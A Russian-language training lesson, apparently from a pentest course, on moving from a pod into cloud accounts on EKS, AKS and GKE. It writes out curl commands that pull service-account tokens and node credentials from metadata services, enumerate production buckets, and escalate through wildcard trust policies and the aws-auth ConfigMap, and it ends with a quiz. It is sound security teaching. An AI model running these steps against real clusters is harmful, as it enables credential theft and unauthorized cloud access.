---
id: cloud-eks-aks-gke
title: "Managed Kubernetes: атаки на EKS, AKS и GKE"
category: cloud
parent: cloud-kubernetes-rbac
difficulty: expert
order: 3
tags: [cloud, eks, aks, gke, kubernetes, iam, workload-identity, managed]
prerequisites: [cloud-kubernetes-rbac, cloud-kubernetes-escape]
useful_for:
  - "Пентест управляемых кластеров Kubernetes"
  - "Связь k8s SA с облачными ролями"
  - "Понимание отличий EKS/AKS/GKE"
estimated_minutes: 40
summary: "Специфика managed-Kubernetes: EKS (IRSA), AKS (workload identity), GKE (workload identity). Как k8s-доступ превращается в облачные права и как атаковать control plane."
---

## Задача

До этого мы работали с «голым» Kubernetes. В реальности кластеры чаще **managed**: EKS у AWS, AKS у Azure, GKE у Google. Владелец не управляет control plane — за него это делает облако. Но взамен появляется то, ради чего мы вообще зашли: **связь между идентичностью пода в Kubernetes и правами в облачном аккаунте**.

Цель урока: понять, как из пода managed-кластера выйти в облако, и в чём разница трёх платформ.

## Данные, с которыми работаем

Мы в поде **GKE**. В прошлых уроках мы видели, что под аутентифицируется перед кластером через SA-токен. Но GKE добавляет второй, куда более интересный канал: **metadata-сервер**. Это локальный сервис, который под может спросить «какие у меня облачные креды?».

Сначала узнаём, за какой аккаунт мы выступаем:

```bash
$ curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
1234567890-compute@developer.gserviceaccount.com
```

`Metadata-Flavor: Google` — обязательный заголовок, которым GKE защищает metadata-сервер от простого SSRF. Мы его знаем, поэтому отвечаем правильно.

## Шаг 1: получаем облачный токен

Просим у metadata-сервера **access token** — временный ключ доступа к GCP API:

```bash
$ TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    | jq -r .access_token)
$ echo ${TOKEN:0:20}...
ya29.c.b0Aa...
```

Это стандартный OAuth-токен GCP. Теперь мы — не «под», а **сервисный аккаунт GCP**, и можем звать облачные API.

## Шаг 2: выясняем, что нам разрешено

Токен есть — надо понять его вес. Начинаем с самого информативного: какие проекты видны.

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://cloudresourcemanager.googleapis.com/v1/projects" | jq -r '.projects[].projectId'
acme-prod
acme-data
```

Видим два проекта. Проверяем доступ к хранилищу:

```bash
$ curl -s -H "Authorization: Bearer $TOKEN" \
    "https://storage.googleapis.com/storage/v1/b?project=acme-prod" | jq -r '.items[].name'
acme-prod-backups
acme-prod-assets
```

Мы читаем **бакеты прода**. Один под без единого эксплойта — только потому, что поду доверили облачную роль. Именно эту связь называют **Workload Identity** (GKE) / **IRSA** (EKS) / workload identity federation (AKS).

## Шаг 3: как эта связь устроена и где её слабое место

Механика во всех трёх облаках похожа: k8s service account **аннотируется** облачной ролью, облако доверяет кластеру через OIDC-провайдера, а под обменивает свой k8s-токен на облачные креды.

В GKE аннотация выглядит так:

```yaml
metadata:
  annotations:
    iam.gke.io/gcp-service-account: app-prod@acme-prod.iam.gserviceaccount.com
```

Слабое место — **условие доверия (trust policy)**. Если в нём указан wildcard вместо конкретного `namespace:serviceaccount`, то **любой** под кластера может встать на эту роль. В EKS это выглядит как `sub` вида `system:serviceaccount:*:*` в trust-политике IAM-роли:

```bash
$ aws iam get-role --role-name EksPodRole \
    --query 'Role.AssumeRolePolicyDocument.Statement[0].Condition'
{
  "StringEquals": { "oidc.eks...:sub": "system:serviceaccount:*:*" }
}
```

`*:*` вместо `prod:app` — и роль доступна всем подам. Это классический мисконфиг managed-кластеров.

## Другой канал: node SA и креды узла

Workload Identity может быть не настроен вовсе — тогда под наследует **node service account**: облачную роль самой ноды. Часто она широкая (`editor` в GKE, широкая IAM-роль в EKS).

```bash
# GKE под без Workload Identity — тот же metadata-сервер, но аккаунт node
$ curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
gke-prod-node@acme-prod.iam.gserviceaccount.com
```

В EKS узел — это EC2-инстанс, и его креды лежат в **IMDS** (`169.254.169.254`) — сервисе метаданных AWS:

```bash
$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
eks-node-role
```

Побег на узел (из прошлых уроков) даёт именно эти креды. Поэтому цепочка «под → узел → node role → аккаунт» — самый частый путь в managed-кластерах.

## Полный прогон от начала до конца

1. Зашли в под GKE, спросили metadata-сервер про аккаунт.
2. Получили access token сервисного аккаунта.
3. Перечислили проекты → нашли `acme-prod` и `acme-data`.
4. Прочитали бакеты прода через storage API.
5. Проверили бы trust-политику с wildcard — тогда на роль встанет любой под.

Один под → данные прода. Никаких CVE: только неверно выданное доверие.

## Если не сработало: специфика платформ

| Платформа | Мост k8s → облако | Что искать в поде |
|-----------|-------------------|-------------------|
| EKS | IRSA (SA → IAM role), node role, `aws-auth` | `AWS_ROLE_ARN`, `/var/run/secrets/eks.amazonaws.com/...`, IMDS |
| AKS | workload identity, kubelet identity | `/var/run/secrets/azure/tokens/azure-identity-token` |
| GKE | Workload Identity, node SA | `metadata.google.internal`, аннотация `iam.gke.io/...` |

Отдельно на EKS стоит проверить **`aws-auth` ConfigMap** — маппинг IAM-принципалов на k8s RBAC. Если у тебя есть права на его изменение, можно выдать себе `system:masters` (полные права в кластере):

```bash
$ kubectl -n kube-system get configmap aws-auth -o yaml | grep -A3 mapUsers
- userarn: arn:aws:iam::111122223333:user/ci-bot
  username: ci-bot
  groups: [system:masters]
```

В AKS аналогичная дыра — **локальные аккаунты** (`disableLocalAccounts=false`): их сертификаты/ключи дают доступ в обход Azure RBAC. В GKE — поды без Workload Identity, использующие node SA.

## Что мы теперь знаем

- Managed-кластер скрывает control plane, но **data plane — твой**: узлы и поды под твоим контролем.
- Workload Identity / IRSA связывает k8s SA с облачной ролью через OIDC.
- Wildcard в trust-политике (`sub: system:serviceaccount:*:*`) позволяет любому поду встать на роль.
- Без Workload Identity под наследует **node SA** — часто широкий.
- На EKS `aws-auth` ConfigMap может дать `system:masters`; на AKS — локальные аккаунты.
- Путь в облако почти всегда: под → узел → креды узла → аккаунт.

## На что смотреть дальше

- **k8s-image-supply-chain**: как через образ попасть на узлы managed-кластера.
- **runc-escape-deep**: побег на уровне рантайма, мимо admission и RBAC.
- **cloud-privesc-iam**: что делать с полученной облачной ролью дальше.

## Квиз

Проверь себя.

```quiz
- question: "Что такое IRSA в EKS?"
  options:
    - "Тип узла"
    - "Привязка k8s service account к IAM-роли через OIDC"
    - "Сетевой плагин"
    - "Формат образа"
  answer: 1
  explanation: "IAM Roles for Service Accounts связывает SA с IAM-ролью."
- question: "Какой ConfigMap в EKS маппит IAM-принципалы на k8s RBAC?"
  options:
    - "kube-system/coredns"
    - "aws-auth"
    - "kube-proxy"
    - "cluster-info"
  answer: 1
  explanation: "aws-auth ConfigMap определяет, кто получает k8s-права."
- question: "Какая опасность у GKE-подов без Workload Identity?"
  options:
    - "Они не запускаются"
    - "Они используют node service account, который часто имеет широкие права"
    - "Они шифруют данные"
    - "Они работают медленнее"
  answer: 1
  explanation: "Без Workload Identity под наследует node SA — частый путь к GCP-правам."
- question: "Что искать в поде для связи с облаком на Azure?"
  options:
    - "/etc/hosts"
    - "/var/run/secrets/azure/tokens/azure-identity-token"
    - "/var/log"
    - "/root"
  answer: 1
  explanation: "Workload identity AKS кладёт токен по этому пути."
- question: "Почему изменение aws-auth ConfigMap критично?"
  options:
    - "Оно меняет DNS"
    - "Оно позволяет выдать себе system:masters (полные права в кластере)"
    - "Оно удаляет поды"
    - "Оно отключает сеть"
  answer: 1
  explanation: "Маппинг IAM в system:masters даёт административный доступ к кластеру."
```

## Куда дальше

В следующем уроке мы займёмся **kubelet API** — агентом на каждой ноде, который часто слушает порт 10250 без должной авторизации и умеет выполнять команды в подах. А пока главное запомни: **в managed-кластере главный приз — не сам кластер, а мост в облако**, и держится он на trust-политике, которую часто пишут слишком широко.

## Где пригодится

- **Пентест managed-k8s** — связь k8s и облака.
- **Red team** — из пода в облачный аккаунт.
- **IR/Blue team** — детект аномалий в IRSA/workload identity.
- **DevSecOps** — настройка Workload Identity и минимизация node-ролей.
- **Сертификации** — CKS, облачные security-сертификаты.
